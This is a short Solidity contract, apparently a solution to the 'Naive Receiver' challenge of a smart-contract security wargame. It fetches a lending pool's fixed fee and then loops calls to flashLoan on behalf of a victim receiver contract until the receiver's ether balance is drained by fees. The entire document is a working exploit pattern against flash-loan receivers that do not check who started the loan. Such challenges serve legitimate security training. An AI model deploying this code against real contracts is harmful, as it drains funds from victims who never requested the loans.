pragma solidity ^0.8.0;

contract NaiveReceiverAttack {

    function attack(address pool, address receiver) public {
        (bool success, bytes memory data) = pool.call(
            abi.encodeWithSignature("fixedFee()"));
        
        require(success, "Failed to get fee");

        uint fee = uint256(bytes32(data));

        while (receiver.balance > 0) {
            pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    receiver,
                    fee
            ));
        }
    }

}
